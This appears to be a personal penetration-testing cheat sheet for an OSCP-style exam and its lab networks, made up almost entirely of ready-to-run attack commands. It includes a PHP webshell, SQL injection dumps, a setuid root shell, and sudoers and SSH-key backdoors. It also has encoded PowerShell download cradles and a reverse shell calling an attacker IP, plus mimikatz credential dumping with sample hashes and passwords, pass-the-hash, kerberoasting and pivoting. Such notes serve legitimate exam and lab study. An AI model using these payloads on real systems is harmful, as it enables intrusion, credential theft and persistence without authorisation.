### exam login


### tar unzip
```
download from email - connectivity pack, copy to kali exam folder.

tar -xvf filename

sudo openvpn xxx.ovpn
enter username
enter password

there will be a troubleshooting file 

chmod +x troubleshoot.sh
./troubleshoot.sh | tee troubleshoot.txt

mousepad troubleshoot.txt

ctrl + a
ctrl + c
ctrl + v to the chat

```
###web app enumeration
```
linux:

if see any user input for command:e.g.ping 127.0.0.1; id

window: ping 127.0.0.1 && whoami

```
### dirbuster
```dirbuster http://dns
```
### Linenum
```
wget http://my own ip/linenum.sh -O /tmp/linenum.sh

chmod 777 /tmp/linenum.sh

/tmp/linenum.sh | tee linout.txt
```
###php onliner webshell
```
<?php system($_REQUEST['cmd']); ?>
```
```
page.php?cmd=id
```
###find files on linux
```
find / -type f -name '*.php' 2>/dev/null
```
###find files on windows
```
powershell

gci -recurse -path c:\ -filter "*.txt" | % { $_.FullName }
```
### sudo change user
```
su - otheruser
```
### nfs showmount https://touhidshaikh.com/blog/2018/04/11/nfs-weak-permissionslinux-privilege-escalation/
```
if see nfs 2049 port

showmount -e target_ip 
-> let's say i see a folder called "/shared"
mkdir nfs
cd nfs
mkdir shared
mount -t nfs target_ip:/shared shared

```
### escape restricted shell
```
export PATH = /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
### start bloodhound
on mac terminal
```
conda deactivate
cd ~/oscp
./start-neo4j.sh
```
```
open bloodhound
```
#### to find certain files
```
find / -name *.ovpn 2>/dev/null
```
2>1 means redirect standard err to standard out
### sql injection (mysql)
#### union based
enum tables
```
OR 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,table_name,11 FROM information_schema.tables#"];
```
table to target: wp_users
enum columns
```
OR 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,column_name,11 FROM information_schema.columns WHERE table_name='wp_users'#"];
```
columns to target: user_login , user_pass
dump data
```
OR 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,concat(user_login,'~',user_pass),11 FROM wp_users#"];
```
### sql injection login bypass
targeting username:
```
admin'-- - (means backend sql will only validate username without looking at password)
```
e.g. original:
```
select user,pass from users where user = 'admin' and password = 'pwd';
```
injected:
```
select user,pass from users where user = 'admin'-- -' and password = 'pwd';
```
### wordpress shell plugins
```
/usr/share/seclists/Web-Shells/WordPress
```

### nslookup
```
nslookup
>server: 10.10.10.x
>10.10.10.x -- to check for the dns info
```

### c setuid shell
```
// gcc -o /tmp/rootshell /tmp/rootshell.c
// chmod u+s /tmp/rootshell
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void)
{
setuid(0); setgid(0); system("/bin/bash");
}
```
### add user to sudoers
```
echo 'reader ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
```
workaround with base64 - use cyberchef
![[Screenshot 2021-12-19 at 8.50.59 PM.png]]
```
echo "cmVhZGVyIEFMTD0oQUxMKSBOT1BBU1NXRDpBTEw=" | base64 -d >> /etc/sudoers
```
check:
```
sudo -l
```
To get a stable python shell
```
python -c 'import pty;pty.spawn("/bin/bash")';

```

Find file:
```
find / -name xxx.php
```
### copy bash and make suid (root priv)
find bash location
```
which bash
```
copy out bash + set suid 
```
cp /usr/bin/bash /tmp/mybash
chmod +s /tmp/mybash
```
activate the bash with suid
```
/tmp/mybash -p
```
oneliner
```
cp /bin/bash /tmp/mybash; chmod +s /tmp/mybash
```
### attack nfs
```
showmount -e
```
### set environment variables
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

### SSH Brute force using metasploit

https://charlesreid1.com/wiki/Metasploitable/SSH/Exploits
### windows creating users
```
net user john password /add

to add to domain (need domain admin. or genericAll on the domain)

net user john password /add /domain
```
### windows adding users to local groups
```
add to local group

net localgroup administrators john /add

to check

net localgroup administrators 
```
### windows adding users to domain groups
```
add to domain group

net group "EXCAHNGE WINDOWS PERMISSSIONS" john /add /domain

to check

net group "EXCAHNGE WINDOWS PERMISSSIONS" /domain
```
### find SPNs
```
Get-domainuser -SPN |select name,serviceprincipalname

name   serviceprincipalname
----   --------------------
krbtgt kadmin/changepw
```
### kerberos silver ticket attack (aka pass the ticket)
-> requirements: Hash of target service account, SID of target domain
-> to find domain SID -> load powerview
```
powershell
```
```
iex(new-object net.webclient).downloadstring('http://192.168.49.96/view.txt')

to check if got powerview
get-netdomain
```
-> now load mimikatz to pass the ticket (silver ticket attack)
```
c:\windows\tasks\m.exe "privilege::debug"
```
```
kerberos::golden /user:offsec /domain:TARGET_DOMAIN /sid:TARGET_DOMAIN_SID /target:TARGET_URL /service:TARGET_SERVICE /rc4:TARGET_SERVICE_ACCOUNT_HASH /ptt
```
```
kerberos::golden /user:offsec /domain:corp1.com /sid:S-1-5-21-3746766531-1610887775-1523133702 /target:CorpWebServer.com /service:HTTPS /rc4:IISSVC_HASH /ptt
```
nmap allports
```
for i in $(cat ips.txt); do nmap -Pn -v -p- $i --min-rate 10000 -oN scans/nmap-alltcp_$i.txt; done 
```
nmap common (linux + windows)
```
for i in $(cat ips.txt);do nmap -Pn -v -p 22,3306,8080,8081,5985,443,80,1433,53,445,25,143,110,993,3389,995,139,587,135 -sCV -oN scans/nmap-tcpscans_$i.txt $i;done
```
impacket-psexec with password (if local account, no need to specify domain)
```
impacket-psexec [e.g:htb.local]/[username]:'[password]'@[ip/dns]

impacket-psexec TRICKY/sqlsvc:'4dfgdfFFF542'@sql07.tricky.com
```
impacket-psexec with hash
```
impacket-psexec [username]@[ip/dns] -hashes [ntlmhash]:[ntlmhash]

impacket-psexec administrator@sql05.tricky.com -hashes aad3b435b51404eeaad3b435b51404ee:2060951907129392809244825245de08
```
chisel proxychains (windows)
```
/opt/chisel/chisel server -p 8000 --reverse

bitsadmin /Transfer myJob http://192.168.49.79/chisel.exe c:\windows\tasks\chisel.exe
c:\windows\tasks\chisel.exe client 192.168.49.79:8000 R:8001:socks

vi dev01.conf
strict chain
proxy_dns
[ProxyList]
socks5 127.0.0.1 8001

proxychains -q -f dev01.conf impacket-psexec TRICKY/sqlsvc:'4dfgdfFFF542'@dc01.tricky.com 
```
chisel proxychains (linux)
```
/opt/chisel/chisel server -p 8000 --reverse

wget http://192.168.49.96/chisel -O /tmp/chisel
chmod 777 /tmp/chisel
/tmp/chisel client 192.168.49.96:8000 R:8001:socks

vi dev01.conf
strict chain
proxy_dns
[ProxyList]
socks5 127.0.0.1 8001

proxychains -q -f dev01.conf impacket-psexec TRICKY/sqlsvc:'4dfgdfFFF542'@dc01.tricky.com 
```
ssh add authorized_keys (just swap out the username -> /home/username/.ssh)
```
echo "c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCZ1FERkEwNVBxSWEvalZvTFNVVDVYZjhmUE5vV0Exa09KTHBGSEo0QTViVkNzZnljSVZmR2RrZFdVMUJaekUza0tWVCt0U3E2eTJZRjRuMmVXZUV6ZEJmaTNqRTRaVVdCZFEyUEJqeWlDK1ZlYXJNWThnZWhQYjkxSE9ZVVIvZFNDLzVUWkpJRkMxY09MS3BFVE5GTDFBR1JGbG9VVm93L2Y5MG15NlJ2UllWcUpHazg1Z3Z6MEdyM3hwKzR6S0Zlc1QxZUFFQjhCTTJMbGRtbmdpSEEyT3YvbXFUdkVvMHBJMHZZZ3BiVmZxdmxDMnBBQ0NnVlZudTRCNy9YWkJmQWF5YW5NUEZWVFVKVGI0TDRja0VsdHFpYVNUaWNMdmptTUtrZTdoOVd1MHdWdk9DeHNmZXB1dUx6aHVZcFlOVnVqb01oUFN4MjBoSzRtYUZ4MWZDVFFsUW5KWHA1TXRzVEtIK0JBcXVPTjgydFJRRmNCazFqaVkwQVRSVWc1bmY4aXFqQXgrWE5PUXZoQ0lSdDlCRmRSbmdGUEtCUVZxS2pRNVhQMGdURTIvYWkraSt1ZkNnRmZHM21UMVhLQmU0N1U4ZWJzUTQzQ1hCZm1XaXdTdmIwZno2b1M4Mm1pZDhBaVQ3TWxFV0IyWHJpUm1rVnhRLzBDYmlpaWdXMjR3Z052bjg9IGthbGlAa2FsaQo=" | base64 -d >> /home/pete@complyedge.com/.ssh/authorized_keys
```

after get the initial shell, run up.txt, if lucky enough, see SeImpersonatePrivilege--> run printSpoofer.exe
```
##upload

meterpreter: upload /var/www/html/PrintSpoofer.exe

powershell: iwr -uri http://192.168.49.96/PrintSpoofer.exe -outfile c:\windows\tasks\PrintSpoofer.exe

##run 

interactive shell on initial shell: c:\windows\tasks\PrintSpoofer.exe -i -c cmd

run non-interactive command:
c:\windows\tasks\PrintSPoofer.exe -c "c:\windows\system32\cmd.exe /c powershell -e aQBlAHgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA0ADkALgA5ADYALwByAHMALgB0AHgAdAAnACkA"
```
mimikatz dump secrets
```
# kill av

powershell
iex(new-object net.webclient).downloadstring('http://192.168.49.96')
```
```
#upload

iwr -uri http://192.168.49.96/mimidrv.sys -outfile c:\windows\tasks\mimidrv.sys
iwr -uri http://192.168.49.96/mimikatz.exe -outfile c:\windows\tasks\m.exe

#dump

c:\windows\tasks\m.exe "privilege::debug" "token::elevate" "!+" "!processprotect /process:lsass.exe /remove" "lsadump::secrets" "exit"
c:\windows\tasks\m.exe "privilege::debug" "token::elevate" "!+" "!processprotect /process:lsass.exe /remove" "sekurlsa::logonpasswords" "exit"

```
results
 ```
   [00000003] Primary
         * Username : tommy
         * Domain   : FINAL
         * NTLM     : 5ad27ee8000951e0669fab25f73f9d8a

  kerberos :
         * Username : tommy
         * Domain   : FINAL.COM
         * Password : 89dsfsji43A
		 
 *Username : WEB05$
         * Domain   : FINAL
         * NTLM     : 2ab14aa1406db2d15621b4a8d1713e01

* Username : Administrator
         * Domain   : WEB05
         * NTLM     : 9689cee5c72d2ef437de593af89bb4ff

* Username : adminWebSvc
         * Domain   : FINAL
         * NTLM     : b0df1cb0819ca0b7d476d4c868175b94

Secret  : _SC_Service1 / service 'Service1' with username : adminWebSvc@final.com
cur/text: FGjksdff89sdfj
```
###windows meterpreter
```
1) change sublime text makerunner.py -> local ip / listening port to current local ip

2) run makerunner.py
┌──(kali㉿kali)-[~/oscp]
└─$ python3 makerunner.py                    
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 809 bytes
Final size of ps1 file: 3968 bytes
Saved as: met64.ps1
[+] met generated: lhost 192.168.49.96, lport 443, bitness 64, format ps1
[!] msfvenom: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.96 LPORT=443 EXITFUNC=thread -f ps1 -o met64.ps1
[+] msf resource script written: basic.rc -> use:
sudo msfconsole -r basic.rc [or] resource basic.rc
[+] runner written: run.txt
[+] run.txt copied to /var/www/html/run.txt
[+] cradle: $wc = (new-object system.net.webclient);$wc.headers.add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko');iex($wc.downloadstring('http://192.168.49.96/run.txt'))
[+] cradle target: http://192.168.49.96/run.txt -> use:
powershell -Win hidden -nonI -noP -Exe ByPass -ENC JAB3AGMAIAA9ACAAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAcwB5AHMAdABlAG0ALgBuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkAOwAkAHcAYwAuAGgAZQBhAGQAZQByAHMALgBhAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJwBNAG8AegBpAGwAbABhAC8ANQAuADAAIAAoAFcAaQBuAGQAbwB3AHMAIABOAFQAIAAxADAALgAwADsAIABUAHIAaQBkAGUAbgB0AC8ANwAuADAAOwAgAHIAdgA6ADEAMQAuADAAKQAgAGwAaQBrAGUAIABHAGUAYwBrAG8AJwApADsAaQBlAHgAKAAkAHcAYwAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4ANAA5AC4AOQA2AC8AcgB1AG4ALgB0AHgAdAAnACkAKQA=

3)
┌──(kali㉿kali)-[~/oscp/exam]
└─$ ./met.sh
[+] copied basic.rc
[+] copied linux.rc


3) run below command under /oscp/exam (working tab)
msfconsole -r basic.rc
```
###load powerup (just like jaws, but will tell more pratical info to escalet the prev) -> cannt do anything here.
```
powershell

iex(new-object net.webclient).downloadstring('http://192.168.49.96/up.txt')
```
### to get a root meterpreter session
```
1) background current channel
ctrl + z

2) background current session
ctrl + z

3) run meterpreter listener in the background
run -j

4) to check
jobs

5) go back to previous session
sessions 
sessions -i 1 (assuming the session is session No.1)

6) go back to previous channel
channel -l 
channel -i 1 (assuming the channel is channel No.1)

7) run meterpreter payload on root meterpreter session

powershell -Win hidden -nonI -noP -Exe ByPass -ENC JAB3AGMAIAA9ACAAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAcwB5AHMAdABlAG0ALgBuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkAOwAkAHcAYwAuAGgAZQBhAGQAZQByAHMALgBhAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJwBNAG8AegBpAGwAbABhAC8ANQAuADAAIAAoAFcAaQBuAGQAbwB3AHMAIABOAFQAIAAxADAALgAwADsAIABUAHIAaQBkAGUAbgB0AC8ANwAuADAAOwAgAHIAdgA6ADEAMQAuADAAKQAgAGwAaQBrAGUAIABHAGUAYwBrAG8AJwApADsAaQBlAHgAKAAkAHcAYwAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4ANAA5AC4AOQA2AC8AcgB1AG4ALgB0AHgAdAAnACkAKQA=

8) listener catch the second meterpreter which is root
9) enter into second meterpreter session
ctrl + z
ctrl + z
sessions
sessions -i 2 
```
### once have root meterpreter, dump secrets
```
hashdump (only will return the lcoal hash)
load kiwi (mimikatz to dump domain secrets)
creds_all

Username       Domain  NTLM                              SHA1                                      DPAPI
--------       ------  ----                              ----                                      -----
Administrator  WEB05   9689cee5c72d2ef437de593af89bb4ff  
WEB05$         FINAL   cdfc9a51eaf52bbd4cb920da33a94fd1  
WEB05$         FINAL   426a605743b34cc258d307598ad3496a  
adminWebSvc    FINAL   b0df1cb0819ca0b7d476d4c868175b94
```
### load powerview to get domain info
```
iex(new-object net.webclient).downloadstring('http://192.168.49.96/view.txt')
```
### run hound.txt
```
iex(new-object net.webclient).downloadstring('http://192.168.49.96/hound.txt')

go to meterpreter to download
ctrl + z
pwd
cd /windows/tasks

download 2022***.zip
```
### ForceChangePassword
```
$SecPassword = ConvertTo-SecureString 'FGjksdff89sdfj' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('FINAL\adminWebSvc', $SecPassword)

$UserPassword = ConvertTo-SecureString 'P@ssw0rd' -AsPlainText -Force

Set-DomainUserPassword -Identity nina -AccountPassword $UserPassword -Credential $Cred -Verbose
```
```
how to check:
get-domainuser nina
```
### powerview enumeration
```
# current domain
get-netdomain

# check other user
get-domainuser nina (just nina)
get-domainuser (all users in current domain)
get-domainuser | select name (just name only)

# check other groups
get-domaingroup (all groups in current domain)
get-domaingroup | select name (just name only)
get-domaingroup "Domain Admins" (just "domain admins" group)

# check other computers 
get-domaincomputer
get-domaincomputer | select name
nslookup dc01
```
### enable RDP (after root)
```
# force RDP to be enabled

Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0

New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0
```
```
# create local user
net user john P@ssw0rd /add
net localgroup administrators john /add
net localgroup "Remote Desktop Users" john /add
net localgroup "Remote Management Users" john /add
```
```
# login RDP from kali

xfreerdp /u:john /d:web05 /p:'P@ssw0rd' /v:192.168.96.181 /cert-ignore

xfreerdp /u:john /d:web05 /p:'P@ssw0rd' /v:web05.final.com /cert-ignore

xfreerdp /u:nina /d:FINAL /p:'P@ssw0rd' /v:web05.final.com /cert-ignore
```
### pass the hash (mimikatz)
```
# first, RDP into a box
xfreerdp /u:john /d:web05 /p:'P@ssw0rd' /v:web05.final.com /cert-ignore

# open admin cmd prompt
# load psexec.exe

powershell
iwr -uri http://192.168.49.96/psexec.exe -outfile c:\windows\tasks\psexec.exe

# open nt authority/system shell
c:\windows\tasks\psexec.exe -accepteula -i -u "NT Authority\SYSTEM" cmd

# load mimikatz
powershell
iwr -uri http://192.168.49.96/mimikatz.exe -outfile c:\windows\tasks\m.exe

# pass the hash
c:\windows\tasks\m.exe "privilege::debug"
sekurlsa::pth /user:adminWebSvc /domain:final.com /ntlm:b0df1cb0819ca0b7d476d4c868175b94 /run:"cmd"

# now you have cmd prompt as adminWebSvc
```
### abuse modifiable services
```
# powerup detected snmptrap

ServiceName   : SNMPTRAP
Path          : C:\Windows\System32\snmptrap.exe
StartName     : NT AUTHORITY\LocalService
AbuseFunction : Invoke-ServiceAbuse -Name 'SNMPTRAP'
CanRestart    : True
Name          : SNMPTRAP
Check         : Modifiable Services
```
```
# below commands must run from cmd prompt, not powershell
sc qc SNMPTRAP
sc config SNMPTRAP start= demand
sc config SNMPTRAP obj= "NT Authority\SYSTEM" password= ""
sc config SNMPTRAP binpath= "cmd.exe /c net user jack P@ssw0rd /add"

sc start snmptrap

sc config SNMPTRAP binpath= "cmd.exe /c net localgroup administrators jack /add"

# alternative - add current user (nina) to local administrators
sc config SNMPTRAP binpath= "cmd.exe /c net localgroup administrators nina /add"
```
### send powershell reverse shell
```
python3 makers.py -l 192.168.49.96 -p 3389
```
```
powershell -enc aQBlAHgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA0ADkALgA5ADYALwByAHMALgB0AHgAdAAnACkA
```
###grab proof.txt
```
windows:
type c:\users\administrator\desktop\proof.txt 

ipconfig

linux:
cat /root/proof.txt 

ip a
```
### grab local.txt
```
# windows - check user home directories

dir c:\users

# go in and grab local.txt

type c:\users\jack\desktop\local.txt

ipconfig

# linux - check user home directories

ls /home

# go in and grab local.txt

cat /home/jack/local.txt

ip a
```
### kerberoast
```
# load powerview

iex(new-object net.webclient).downloadstring('http://192.168.49.96/view.txt')

# invoke kerberoast (hashcat format)
invoke-kerberoast -outputformat 'hashcat'

# example result:

SamAccountName       : sqlsvc03
DistinguishedName    : CN=sqlsvc03,OU=FinalServices,OU=FinalUsers,DC=final,DC=com
ServicePrincipalName : MSSQLSvc/sql03.final.com:1433
TicketByteHexStream  : 
Hash                 : $krb5tgs$23$*sqlsvc03$final.com$MSSQLSvc/sql03.final.com:1433*$D11667E2F96A992C6E1BB955869DA053$ ...

# copy out hash and remove whitespace using CyberChef -> Remove Whitespaces

# save as sqlsvc03.krb5tgs (change username accordingly)

# crack using hashcat

hashcat -m 13100 sqlsvc03.krb5tgs /usr/share/wordlists/rockyou.txt --force
```
